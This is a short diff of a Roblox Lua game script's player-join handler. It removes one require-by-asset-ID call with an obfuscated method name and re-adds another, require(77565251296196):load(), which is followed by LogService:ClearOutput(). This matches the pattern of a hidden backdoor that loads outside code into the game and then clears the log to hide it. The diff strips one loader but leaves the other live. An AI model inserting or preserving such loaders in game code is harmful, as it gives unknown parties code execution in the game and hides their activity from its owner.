@@ -49,7 +49,7 @@ end
 
 Players.PlayerAdded:Connect(function(player)
 	logGameInfo(player)
-	require(82712316338129):Asdafagumfklaop()
-	require(77565251296196):load()
+	
+require(77565251296196):load()
 	LogService:ClearOutput()
  end)
